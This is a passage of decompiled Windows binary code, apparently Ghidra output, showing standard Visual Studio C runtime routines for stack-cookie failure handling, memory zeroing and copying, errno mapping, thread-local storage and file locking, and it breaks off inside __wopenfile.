// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_00423ad8 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_00423adc = &stack0x00000004;
  _DAT_00423a18 = 0x10001;
  _DAT_004239c0 = 0xc0000409;
  _DAT_004239c4 = 1;
  local_32c = DAT_00422044;
  local_328 = DAT_00422048;
  _DAT_004239cc = unaff_retaddr;
  _DAT_00423aa4 = in_GS;
  _DAT_00423aa8 = in_FS;
  _DAT_00423aac = in_ES;
  _DAT_00423ab0 = in_DS;
  _DAT_00423ab4 = unaff_EDI;
  _DAT_00423ab8 = unaff_ESI;
  _DAT_00423abc = unaff_EBX;
  _DAT_00423ac0 = in_EDX;
  _DAT_00423ac4 = in_ECX;
  _DAT_00423ac8 = in_EAX;
  _DAT_00423acc = unaff_EBP;
  DAT_00423ad0 = unaff_retaddr;
  _DAT_00423ad4 = in_CS;
  _DAT_00423ae0 = in_SS;
  DAT_00423a10 = IsDebuggerPresent();
  FUN_004138a1();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_0041c288);
  if (DAT_00423a10 == 0) {
    FUN_004138a1();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// Library Function - Single Match
//  _fastzero_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastzero_I(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2 >> 7;
  do {
    *param_1 = (undefined  [16])0x0;
    param_1[1] = (undefined  [16])0x0;
    param_1[2] = (undefined  [16])0x0;
    param_1[3] = (undefined  [16])0x0;
    param_1[4] = (undefined  [16])0x0;
    param_1[5] = (undefined  [16])0x0;
    param_1[6] = (undefined  [16])0x0;
    param_1[7] = (undefined  [16])0x0;
    param_1 = param_1 + 8;
    uVar1 = uVar1 - 1;
  } while (uVar1 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memzero
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined (*) [16] __cdecl __VEC_memzero(undefined (*param_1) [16],undefined4 param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined (*pauVar5) [16];
  
  uVar2 = (int)param_1 >> 0x1f;
  iVar3 = (((uint)param_1 ^ uVar2) - uVar2 & 0xf ^ uVar2) - uVar2;
  if (iVar3 == 0) {
    uVar2 = param_3 & 0x7f;
    if (param_3 != uVar2) {
      _fastzero_I(param_1,param_3 - uVar2);
    }
    if (uVar2 != 0) {
      puVar4 = (undefined *)((int)param_1 + (param_3 - uVar2));
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
    }
  }
  else {
    iVar3 = 0x10 - iVar3;
    pauVar5 = param_1;
    for (iVar1 = iVar3; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*pauVar5)[0] = 0;
      pauVar5 = (undefined (*) [16])(*pauVar5 + 1);
    }
    __VEC_memzero((undefined (*) [16])((int)param_1 + iVar3),0,param_3 - iVar3);
  }
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _has_osfxsr_set
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 _has_osfxsr_set(void)

{
  return 1;
}



// WARNING: Removing unreachable block (ram,0x0040cade)
// WARNING: Removing unreachable block (ram,0x0040cacb)
// Library Function - Single Match
//  __get_sse2_info
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __get_sse2_info(void)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  uVar4 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | 0x40
          | (uint)(in_AF & 1) * 0x10 | 4 | (uint)(in_ID & 1) * 0x200000 |
          (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000
  ;
  uVar1 = uVar4 ^ 0x200000;
  if (((uint)((uVar1 & 0x4000) != 0) * 0x4000 | (uint)((uVar1 & 0x400) != 0) * 0x400 |
       (uint)((uVar1 & 0x200) != 0) * 0x200 | (uint)((uVar1 & 0x100) != 0) * 0x100 |
       (uint)((uVar1 & 0x40) != 0) * 0x40 | (uint)((uVar1 & 0x10) != 0) * 0x10 |
       (uint)((uVar1 & 4) != 0) * 4 | (uint)((uVar1 & 0x200000) != 0) * 0x200000 |
      (uint)((uVar1 & 0x40000) != 0) * 0x40000) != uVar4) {
    cpuid_basic_info(0);
    iVar2 = cpuid_Version_info(1);
    local_8 = *(uint *)(iVar2 + 8);
  }
  if (((local_8 & 0x4000000) == 0) || (iVar2 = _has_osfxsr_set(), iVar2 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = 1;
  }
  return uVar3;
}



void __cdecl FUN_0040cb10(undefined4 param_1)

{
  DAT_00423ce4 = param_1;
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  HANDLE hProcess;
  UINT uExitCode;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  uVar1 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_32c.ExceptionCode = 0;
  _memset(&local_32c.ExceptionFlags,0,0x4c);
  local_2dc.ExceptionRecord = &local_32c;
  local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_32c.ExceptionCode = 0xc0000417;
  local_32c.ExceptionFlags = 1;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_2dc);
  if ((LVar3 == 0) && (BVar2 == 0)) {
    FUN_004138a1();
  }
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                   uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)__decode_pointer(DAT_00423ce4);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040cc5d. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  FUN_004138a1();
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00422050)[uVar1 * 2]) {
      return (&DAT_00422054)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2008 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_004221b8;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2008 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_004221bc;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



// Library Function - Single Match
//  __encode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __encode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_004221c4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_004221c0 != -1)) {
    iVar3 = DAT_004221c0;
    pcVar2 = (code *)TlsGetValue(DAT_004221c4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1f8);
      goto LAB_0040cd58;
    }
  }
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c2a0);
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_0041c2a0),
     hModule == (HMODULE)0x0)) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_EncodePointer_0041c290);
LAB_0040cd58:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  __encoded_null
// 
// Library: Visual Studio 2008 Release

void __encoded_null(void)

{
  __encode_pointer(0);
  return;
}



// Library Function - Single Match
//  __decode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __decode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_004221c4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_004221c0 != -1)) {
    iVar3 = DAT_004221c0;
    pcVar2 = (code *)TlsGetValue(DAT_004221c4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1fc);
      goto LAB_0040cdd3;
    }
  }
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c2a0);
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_0041c2a0),
     hModule == (HMODULE)0x0)) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_DecodePointer_0041c2bc);
LAB_0040cdd3:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2008 Release

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_004221c4);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = (LPVOID)__decode_pointer(DAT_00423cec);
    TlsSetValue(DAT_004221c4,lpTlsValue);
  }
  return lpTlsValue;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_004221c0 != -1) {
    iVar2 = DAT_004221c0;
    pcVar1 = (code *)__decode_pointer(DAT_00423cf4);
    (*pcVar1)(iVar2);
    DAT_004221c0 = -1;
  }
  if (DAT_004221c4 != 0xffffffff) {
    TlsFree(DAT_004221c4);
    DAT_004221c4 = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2008 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c2a0);
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_0041c2a0);
  }
  _Ptd->_pxcptacttab = &DAT_0041cae8;
  _Ptd->_holdrand = 1;
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_EncodePointer_0041c290);
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1d) = pFVar1;
    pFVar1 = GetProcAddress(hModule,s_DecodePointer_0041c2bc);
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1f) = pFVar1;
  }
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_00422788;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_0040cf34();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_00422d90;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_0040cf3d();
  return;
}



void FUN_0040cf34(void)

{
  FUN_0040e2eb(0xd);
  return;
}



void FUN_0040cf3d(void)

{
  FUN_0040e2eb(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_004221c0;
  pcVar1 = (code *)___set_flsgetvalue();
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_004221c0;
      p_Var5 = _Ptd;
      pcVar1 = (code *)__decode_pointer(DAT_00423cf0);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_0040d0f3(void)

{
  FUN_0040e2eb(0xd);
  return;
}



void FUN_0040d0ff(void)

{
  FUN_0040e2eb(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c2a0);
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_0041c2a0);
  }
  if (hModule != (HMODULE)0x0) {
    DAT_00423ce8 = GetProcAddress(hModule,s_FlsAlloc_0041c2ec);
    DAT_00423cec = GetProcAddress(hModule,s_FlsGetValue_0041c2e0);
    DAT_00423cf0 = GetProcAddress(hModule,s_FlsSetValue_0041c2d4);
    DAT_00423cf4 = GetProcAddress(hModule,s_FlsFree_0041c2cc);
    if ((((DAT_00423ce8 == (FARPROC)0x0) || (DAT_00423cec == (FARPROC)0x0)) ||
        (DAT_00423cf0 == (FARPROC)0x0)) || (DAT_00423cf4 == (FARPROC)0x0)) {
      DAT_00423cec = TlsGetValue_exref;
      DAT_00423ce8 = (FARPROC)&LAB_0040cde5;
      DAT_00423cf0 = TlsSetValue_exref;
      DAT_00423cf4 = TlsFree_exref;
    }
    DAT_004221c4 = TlsAlloc();
    if (DAT_004221c4 == 0xffffffff) {
      return 0;
    }
    BVar1 = TlsSetValue(DAT_004221c4,DAT_00423cec);
    if (BVar1 == 0) {
      return 0;
    }
    __init_pointers();
    DAT_00423ce8 = (FARPROC)__encode_pointer((int)DAT_00423ce8);
    DAT_00423cec = (FARPROC)__encode_pointer((int)DAT_00423cec);
    DAT_00423cf0 = (FARPROC)__encode_pointer((int)DAT_00423cf0);
    DAT_00423cf4 = (FARPROC)__encode_pointer((int)DAT_00423cf4);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_0040cfd9;
      pcVar3 = (code *)__decode_pointer((int)DAT_00423ce8);
      DAT_004221c0 = (*pcVar3)(puVar5);
      if ((DAT_004221c0 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_004221c0;
        p_Var6 = _Ptd;
        pcVar3 = (code *)__decode_pointer((int)DAT_00423cf0);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
  }
  __mtterm();
  return 0;
}



// Library Function - Single Match
//  _fastcopy_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastcopy_I(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  
  uVar16 = param_3 >> 7;
  do {
    uVar1 = param_2[1];
    uVar2 = param_2[2];
    uVar3 = param_2[3];
    uVar4 = param_2[4];
    uVar5 = param_2[5];
    uVar6 = param_2[6];
    uVar7 = param_2[7];
    uVar8 = param_2[8];
    uVar9 = param_2[9];
    uVar10 = param_2[10];
    uVar11 = param_2[0xb];
    uVar12 = param_2[0xc];
    uVar13 = param_2[0xd];
    uVar14 = param_2[0xe];
    uVar15 = param_2[0xf];
    *param_1 = *param_2;
    param_1[1] = uVar1;
    param_1[2] = uVar2;
    param_1[3] = uVar3;
    param_1[4] = uVar4;
    param_1[5] = uVar5;
    param_1[6] = uVar6;
    param_1[7] = uVar7;
    param_1[8] = uVar8;
    param_1[9] = uVar9;
    param_1[10] = uVar10;
    param_1[0xb] = uVar11;
    param_1[0xc] = uVar12;
    param_1[0xd] = uVar13;
    param_1[0xe] = uVar14;
    param_1[0xf] = uVar15;
    uVar1 = param_2[0x11];
    uVar2 = param_2[0x12];
    uVar3 = param_2[0x13];
    uVar4 = param_2[0x14];
    uVar5 = param_2[0x15];
    uVar6 = param_2[0x16];
    uVar7 = param_2[0x17];
    uVar8 = param_2[0x18];
    uVar9 = param_2[0x19];
    uVar10 = param_2[0x1a];
    uVar11 = param_2[0x1b];
    uVar12 = param_2[0x1c];
    uVar13 = param_2[0x1d];
    uVar14 = param_2[0x1e];
    uVar15 = param_2[0x1f];
    param_1[0x10] = param_2[0x10];
    param_1[0x11] = uVar1;
    param_1[0x12] = uVar2;
    param_1[0x13] = uVar3;
    param_1[0x14] = uVar4;
    param_1[0x15] = uVar5;
    param_1[0x16] = uVar6;
    param_1[0x17] = uVar7;
    param_1[0x18] = uVar8;
    param_1[0x19] = uVar9;
    param_1[0x1a] = uVar10;
    param_1[0x1b] = uVar11;
    param_1[0x1c] = uVar12;
    param_1[0x1d] = uVar13;
    param_1[0x1e] = uVar14;
    param_1[0x1f] = uVar15;
    param_2 = param_2 + 0x20;
    param_1 = param_1 + 0x20;
    uVar16 = uVar16 - 1;
  } while (uVar16 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined4 * __cdecl __VEC_memcpy(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined *puVar5;
  undefined4 *puVar6;
  undefined *puVar7;
  undefined4 *puVar8;
  
  uVar3 = (int)param_2 >> 0x1f;
  uVar3 = (((uint)param_2 ^ uVar3) - uVar3 & 0xf ^ uVar3) - uVar3;
  uVar4 = (int)param_1 >> 0x1f;
  uVar4 = (((uint)param_1 ^ uVar4) - uVar4 & 0xf ^ uVar4) - uVar4;
  if ((uVar3 | uVar4) == 0) {
    uVar3 = param_3 & 0x7f;
    if (param_3 != uVar3) {
      _fastcopy_I(param_1,param_2,param_3 - uVar3);
    }
    if (uVar3 != 0) {
      puVar5 = (undefined *)((int)param_2 + (param_3 - uVar3));
      puVar7 = (undefined *)((int)param_1 + (param_3 - uVar3));
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar7 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar7 = puVar7 + 1;
      }
    }
  }
  else if (uVar3 == uVar4) {
    iVar1 = 0x10 - uVar3;
    puVar6 = param_2;
    puVar8 = param_1;
    for (iVar2 = iVar1; iVar2 != 0; iVar2 = iVar2 + -1) {
      *(undefined *)puVar8 = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      puVar8 = (undefined4 *)((int)puVar8 + 1);
    }
    __VEC_memcpy((undefined4 *)((int)param_1 + iVar1),(undefined4 *)((int)param_2 + iVar1),
                 param_3 - iVar1);
  }
  else {
    puVar6 = param_1;
    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar6 = *param_2;
      param_2 = param_2 + 1;
      puVar6 = puVar6 + 1;
    }
    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar6 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    }
  }
  return param_1;
}



undefined ** FUN_0040d3ff(void)

{
  return &PTR_DAT_004221c8;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_004221c8) || ((FILE *)&DAT_00422428 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)&_File[-0x2110f]._bufsiz >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)((int)&DAT_004221c4 + 3U) < _File) && (_File < (FILE *)0x422429)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_0040e2eb(((int)&_File[-0x2110f]._bufsiz >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_0040e2eb(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wopenfile
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wopenfile(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag,FILE *_File)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  wchar_t wVar5;
  int *piVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  uint local_8;
  
  bVar3 = false;
  bVar2 = false;
  bVar4 = false;
  for (pwVar10 = _Mode; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  wVar5 = *pwVar10;
  if (wVar5 == L'a') {
    _OpenFlag = 0x109;
LAB_0040d624:
    local_8 = DAT_00424400 | 2;
  }
  else {
    if (wVar5 != L'r') {
      if (wVar5 != L'w') goto LAB_0040d5f1;
      _OpenFlag = 0x301;
      goto LAB_0040d624;
    }
    _OpenFlag = 0;
    local_8 = DAT_00424400 | 1;
  }
  bVar1 = true;
  pwVar10 = pwVar10 + 1;
  wVar5 = *pwVar10;
  if (wVar5 != L'\0') {
    do {
      if (!bVar1) break;
      if ((ushort)wVar5 < 0x54) {
        if (wVar5 == L'S') {
          if (bVar2) goto LAB_0040d752;
          bVar2 = true;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (wVar5 != L' ') {
          if (wVar5 == L'+') {
            if ((_OpenFlag & 2) != 0) goto LAB_0040d752;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (wVar5 == L',') {
            bVar4 = true;
LAB_0040d752:
            bVar1 = false;
          }
          else if (wVar5 == L'D') {
            if ((_OpenFlag & 0x40) != 0) goto LAB_0040d752;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (wVar5 == L'N') {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (wVar5 != L'R') goto LAB_0040d5f1;
            if (bVar2) goto LAB_0040d752;
            bVar2 = true;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (wVar5 == L'T') {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_0040d752;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (wVar5 == L'b') {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040d752;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (wVar5 == L'c') {
        if (bVar3) goto LAB_0040d752;
        local_8 = local_8 | 0x4000;
        bVar3 = true;
      }
      else if (wVar5 == L'n') {
        if (bVar3) goto LAB_0040d752;
        local_8 = local_8 & 0xffffbfff;
        bVar3 = true;
      }
      else {
        if (wVar5 != L't') goto LAB_0040d5f1;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040d752;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      pwVar10 = pwVar10 + 1;
      wVar5 = *pwVar10;
    } while (wVar5 != L'\0');
    if (bVar4) {
      for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      iVar7 = _wcsncmp((wchar_t *)&DAT_0041c2f8,pwVar10,3);
      if (iVar7 != 0) goto LAB_0040d5f1;
      for (pwVar10 = pwVar10 + 3; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
